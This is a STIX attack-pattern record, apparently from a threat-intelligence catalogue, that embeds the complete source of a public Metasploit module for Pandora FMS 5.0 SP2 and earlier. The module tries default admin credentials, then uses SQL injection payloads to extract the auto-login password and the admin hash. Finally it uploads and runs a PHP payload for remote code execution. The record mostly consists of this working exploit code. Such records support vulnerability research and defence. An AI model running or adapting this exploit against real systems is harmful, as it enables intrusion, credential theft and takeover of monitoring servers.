{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--0a5b74b5-7b6b-416c-ba8e-706cd8c29573",
    "created": "2024-08-14T17:03:22.541866Z",
    "modified": "2024-08-14T17:03:22.54187Z",
    "name": "Pandora FMS Default Credential / SQLi Remote Code Execution",
    "description": " This module attempts to exploit multiple issues in order to gain remote code execution under Pandora FMS version <= 5.0 SP2.  First, an attempt to authenticate using default credentials is performed.  If this method fails, a SQL injection vulnerability is leveraged in order to extract the \"Auto Login\" password hash.  If this value is not set, the module will then extract the administrator account's MD5 password hash.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/pandora_fms_sqli.rb",
            "external_id": "pandora_fms_sqli.rb"
        },
        {
            "source_name": "reference",
            "url": "http://pandorafms.com/downloads/whats_new_5-SP3.pdf"
        },
        {
            "source_name": "reference",
            "url": "http://blog.pandorafms.org/?p=2041"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::FileDropper\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => 'Pandora FMS Default Credential / SQLi Remote Code Execution',\n      'Description'    => %q{\n        This module attempts to exploit multiple issues in order to gain remote\n        code execution under Pandora FMS version <= 5.0 SP2.  First, an attempt\n        to authenticate using default credentials is performed.  If this method\n        fails, a SQL injection vulnerability is leveraged in order to extract\n        the \"Auto Login\" password hash.  If this value is not set, the module\n        will then extract the administrator account's MD5 password hash.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Lincoln <Lincoln[at]corelan.be>', # Discovery, Original Proof of Concept\n          'Jason Kratzer <pyoor[at]corelan.be>' # Metasploit Module\n        ],\n      'References'     =>\n        [\n          ['URL', 'http://pandorafms.com/downloads/whats_new_5-SP3.pdf'],\n          ['URL', 'http://blog.pandorafms.org/?p=2041']\n        ],\n      'Platform'       => 'php',\n      'Arch'           => ARCH_PHP,\n      'Targets'        =>\n        [\n          ['Pandora FMS version <= 5.0 SP2', {}]\n        ],\n      'Privileged'     => false,\n      'Payload'        =>\n        {\n          'Space'       => 50000,\n          'DisableNops' => true,\n        },\n      'DisclosureDate' => '2014-02-01',\n      'DefaultTarget'  => 0))\n\n      register_options(\n        [\n          OptString.new('TARGETURI', [true, 'The URI of the vulnerable Pandora FMS instance', '/pandora_console/']),\n          OptString.new('USER', [false, 'The username to authenticate with', 'admin']),\n          OptString.new('PASS', [false, 'The password to authenticate with', 'pandora']),\n        ])\n  end\n\n  def post_auth?\n    # Post auth is optional\n    true\n  end\n\n  def default_credential?\n    true\n  end\n\n  def uri\n    target_uri.path\n  end\n\n\n  def check\n    vprint_status(\"Trying to detect installed version\")\n\n    version = nil\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri'    => normalize_uri(uri, 'index.php')\n    })\n\n    if res && res.code == 200 && res.body =~ /Pandora FMS - the Flexible Monitoring System/\n      if res.body =~ /<div id=\"ver_num\">v(.*?)<\\/div>/\n        version = $1\n      else\n        return Exploit::CheckCode::Detected\n      end\n    end\n\n    unless version.nil?\n      vprint_status(\"Pandora FMS #{version} found\")\n      if Rex::Version.new(version) <= Rex::Version.new('5.0SP2')\n        return Exploit::CheckCode::Appears\n      end\n    end\n\n    Exploit::CheckCode::Safe\n  end\n\n\n  # Attempt to login with credentials (default admin:pandora)\n  def authenticate\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(uri, 'index.php'),\n      'vars_get' => {\n        'login' => \"1\",\n      },\n      'vars_post' => {\n        'nick' => datastore['USER'],\n        'pass' => datastore['PASS'],\n        'Login' => 'Login',\n      }\n    })\n\n    return auth_succeeded?(res)\n  end\n\n  # Attempt to login with auto login and SQLi\n  def login_hash\n    clue = rand_text_alpha(8)\n    sql_clue = clue.each_byte.map { |b| b.to_s(16) }.join\n    # select value from tconfig where token = 'loginhash_pwd';\n    sqli = \"1' AND (SELECT 2243 FROM(SELECT COUNT(*),CONCAT(0x#{sql_clue},(SELECT MID((IFNULL(CAST\"\n    sqli << \"(value AS CHAR),0x20)),1,50) FROM tconfig WHERE token = 0x6c6f67696e686173685f707764 \"\n    sqli << \"LIMIT 0,1),0x#{sql_clue},FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP \"\n    sqli << \"BY x)a) AND 'msf'='msf\"\n\n    password = inject_sql(sqli, clue)\n\n    if password && password.length != 0\n      print_status(\"Extracted auto login password (#{password})\")\n    else\n      print_error(\"No auto login password has been defined!\")\n      return false\n    end\n\n    print_status(\"Attempting to authenticate using (admin:#{password})\")\n    # Attempt to login using login hash password\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(uri, 'index.php'),\n      'vars_get' => {\n        'loginhash' => 'auto',\n      },\n      'vars_post' => {\n        'loginhash_data' => Rex::Text.md5(\"admin#{password}\"),\n        'loginhash_user' => 'admin',\n      }\n    })\n\n    return auth_succeeded?(res)\n  end\n\n\n  def auth_succeeded?(res)\n    if res && res.code == 200 && res.body.include?('Welcome to Pandora FMS')\n      print_good(\"Successfully authenticated\")\n      print_status(\"Attempting to retrieve session cookie\")\n      @cookie = res.get_cookies\n      if @cookie.include?('PHPSESSID')\n        print_good(\"Successfully retrieved session cookie: #{@cookie}\")\n        return true\n      else\n        print_error(\"Error retrieving cookie!\")\n      end\n    else\n      print_error(\"Authentication failed!\")\n    end\n\n    false\n  end\n\n\n  def extract\n    # Generate random string and convert to hex\n    clue = rand_text_alpha(8)\n    hex_clue = clue.each_byte.map { |b| b.to_s(16) }.join\n\n    # select password from tusuario where id_user = 0;\n    sqli = \"test' AND (SELECT 5612 FROM(SELECT COUNT(*),CONCAT(0x#{hex_clue},(SELECT MID((IFNULL\"\n    sqli << \"(CAST(password AS CHAR),0x20)),1,50) FROM tusuario WHERE id_user = 0 LIMIT 0,1)\"\n    sqli << \",0x#{hex_clue},FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY \"\n    sqli << \"x)a) AND 'msf'='msf\"\n\n    password = inject_sql(sqli, clue)\n\n    if password && password.length != 0\n      print_good(\"Extracted admin password hash, unsalted md5 - [ #{password} ]\")\n    else\n      print_error(\"Unable to extract password hash!\")\n      return false\n    end\n  end\n\n\n  def inject_sql(sql, fence_post)\n    # Extract password hash from database\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri'    => normalize_uri(uri, 'mobile', 'index.php'),\n      'vars_post' => {\n        'action' => 'login',\n        'user' => sql,\n        'password' => 'pass',\n        'input' => 'Login'\n      }\n    })\n\n    result = nil\n    if res && res.code == 200\n      match = res.body.match(/(?<=#{fence_post})(.*)(?=#{fence_post})/)\n      if match\n        result = match[1]\n      else\n        print_error(\"SQL injection failed\")\n      end\n    end\n    result\n  end\n\n  def upload\n    # Extract hash and hash2 from response\n    res = send_request_cgi({\n      'method' => 'GET',\n      'cookie' => @cookie,\n      'uri'    => normalize_uri(uri, 'index.php'),\n      'vars_get' => {\n        'sec' => 'gsetup',\n        'sec2' => 'godmode/setup/file_manager'\n      }\n    })\n\n    if res && res.code == 200 && res.body =~ /(?<=input type=\"submit\" id=\"submit-go\")(.*)(?=<input id=\"hidden-directory\" name=\"directory\" type=\"hidden\")/\n      form = $1\n\n      # Extract hash\n      if form =~ /(?<=name=\"hash\" type=\"hidden\"  value=\")(.*?)(?=\" \\/>)/\n        hash = $1\n      else\n        print_error(\"Could not extract hash from response!\")\n        fail_with(Failure::Unknown, \"#{peer} - Unable to inject payload!\")\n      end\n\n      # Extract hash2\n      if form =~ /(?<=name=\"hash2\" type=\"hidden\"  value=\")(.*?)(?=\" \\/>)/\n        hash2 = $1\n      else\n        print_error(\"Could not extract hash2 from response!\")\n        fail_with(Failure::Unknown, \"#{peer} - Unable to inject payload!\")\n      end\n\n      # Extract real_directory\n      if form =~ /(?<=name=\"real_directory\" type=\"hidden\"  value=\")(.*?)(\" \\/>)/\n        real_directory = $1\n      else\n        print_error(\"Could not extract real_directory from response!\")\n        fail_with(Failure::Unknown, \"#{peer} - Unable to inject payload!\")\n      end\n    else\n      print_error(\"Could not identify upload form!\")\n      fail_with(Failure::Unknown, \"#{peer} - Unable to inject payload!\")\n    end\n\n\n    # Upload script\n    @payload_name = \"#{rand_text_alpha(8)}.php\"\n    post_data = Rex::MIME::Message.new\n    post_data.add_part(\"<?php #{payload.encoded} ?>\", 'text/plain', nil, %Q^form-data; name=\"file\"; filename=\"#{@payload_name}\"^)\n    post_data.add_part('', nil, nil, 'form-data; name=\"unmask\"')\n    post_data.add_part('Go', nil, nil, 'form-data; name=\"go\"')\n    post_data.add_part(real_directory, nil, nil, 'form-data; name=\"real_directory\"')\n    post_data.add_part('images', nil, nil, 'form-data; name=\"directory\"')\n    post_data.add_part(\"#{hash}\", nil, nil, 'form-data; name=\"hash\"')\n    post_data.add_part(\"#{hash2}\", nil, nil, 'form-data; name=\"hash2\"')\n    post_data.add_part('1', nil, nil, 'form-data; name=\"upload_file_or_zip\"')\n\n    print_status(\"Attempting to upload payload #{@payload_name}...\")\n    res = send_request_cgi({\n      'method' => 'POST',\n      'cookie' => @cookie,\n      'uri'    => normalize_uri(uri, 'index.php'),\n      'ctype'   => \"multipart/form-data; boundary=#{post_data.bound}\",\n      'data' => post_data.to_s,\n      'vars_get' => {\n        'sec' => 'gsetup',\n        'sec2' => 'godmode/setup/file_manager'\n      }\n    })\n\n    if res && res.code == 200 && res.body.include?(\"Upload correct\")\n      register_file_for_cleanup(@payload_name)\n      print_good(\"Successfully uploaded payload\")\n    else\n      fail_with(Failure::Unknown, \"#{peer} - Unable to inject payload!\")\n    end\n  end\n\n\n  def exploit\n    # First try to authenticate using default or user-supplied credentials\n    print_status(\"Attempting to authenticate using (#{datastore['USER']}:#{datastore['PASS']})\")\n    auth = authenticate\n\n    unless auth\n      print_status(\"Attempting to extract auto login hash via SQLi\")\n      auth = login_hash\n    end\n\n    unless auth\n      print_status(\"Attempting to extract admin password hash with SQLi\")\n      extract\n      fail_with(Failure::NoAccess, \"#{peer} - Unable to perform remote code execution!\")\n    end\n\n    print_status(\"Uploading PHP payload...\")\n    upload\n\n    print_status(\"Executing payload...\")\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri'    => normalize_uri(uri, 'images', @payload_name),\n      'cookie' => @cookie\n    }, 1)\n  end\nend\n",
    "x_mitre_disclosure_date": "2014-02-01",
    "x_mitre_platforms": [
        "php'"
    ]
}